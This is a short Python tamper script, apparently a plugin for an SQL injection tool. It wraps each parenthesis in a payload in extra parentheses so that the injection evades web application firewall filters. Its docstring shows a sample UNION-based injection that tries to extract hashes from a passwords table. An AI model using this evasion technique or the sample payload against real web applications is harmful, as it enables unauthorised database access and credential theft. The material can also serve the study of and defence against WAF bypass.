from main_modules.settings import PRIORITY, TYPE
__classificationtype__=TYPE.UNIVERSAL
__priority__ = PRIORITY.LOW


def tamper(payload, **kwargs):
    """
        /?id=(1)union(((((((select(*),hex(hash)from(passwords))))))))
    """
    payload=payload.replace('(', "(((((((")
    payload=payload.replace(')', ")))))))")
    return (payload) if payload else payload
